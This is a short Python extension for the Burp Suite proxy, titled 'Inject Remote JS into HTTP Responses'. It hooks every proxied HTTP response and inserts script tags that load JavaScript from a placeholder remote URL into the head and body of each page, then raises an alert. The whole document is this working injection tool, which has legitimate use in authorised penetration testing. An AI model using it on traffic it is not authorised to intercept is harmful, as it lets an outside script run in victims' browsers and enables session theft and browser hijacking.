from burp import IBurpExtender
from burp import IHttpListener

class BurpExtender(IBurpExtender, IHttpListener):
    
    def	registerExtenderCallbacks(self, callbacks):
        
        # Make available to whole class
        self._callbacks = callbacks
        
        # Set name
        callbacks.setExtensionName("Inject Remote JS into HTTP Responses")
        
        # Register HTTP listener
        callbacks.registerHttpListener(self)
        
        return
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        
        # Only process responses
        if not messageIsRequest:

            # Get response
            content = messageInfo.getResponse()

            # Inject arbitrary script into responses
            contentStr = self._callbacks.getHelpers().bytesToString(content)
            changedContent = contentStr.replace('<head>', '<head><script src="$REPLACEME$"></script>')
            changedContent = changedContent.replace('<body>', '<body><script src="$REPLACEME$"></script>')
            changedContent = changedContent.replace('<content>', '<content>&lt;script src=&quot;$REPLACEME$&quot;&gt;&lt;/script&gt;')
            
            # Set the response if the content changed and alert
            if contentStr != changedContent:
                messageInfo.setResponse(changedContent)
                self._callbacks.issueAlert("Injected JavaScript!")

      